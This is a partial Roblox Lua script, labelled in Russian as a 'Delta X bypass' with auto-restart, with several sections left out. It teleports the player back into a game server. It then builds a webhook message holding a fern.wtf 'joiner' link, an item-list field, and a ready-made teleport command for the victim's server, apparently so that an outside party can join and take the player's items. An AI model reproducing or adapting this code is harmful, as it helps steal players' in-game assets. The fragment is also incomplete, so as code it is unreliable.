...
-- Delta X bypass с автоматическим перезапуском
...
-- Проверяем, был ли скрипт запущен автоматически после телепортации
if _G.AutoRestart and _G.JobId then
    -- Ждем загрузки игры и подключаемся к тому же серверу
...
for _ = 1, 2 do
    task.spawn(function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(920587237, _G.JobId or game.JobId)
    end)
    task.wait(0.5)
end
...
-- Если это автоматический перезапуск, пропускаем некоторые проверки
if not _G.AutoRestart then
...
local function SendJoinMessage(list, prefix)
    ...
    local fields = {
        ...
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. (_G.JobId or game.JobId)
        },
        {
            name = "📜Item list:",
            value = "",
    ...
    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. (_G.JobId or game.JobId) .. "')",
        ["embeds"] = {{
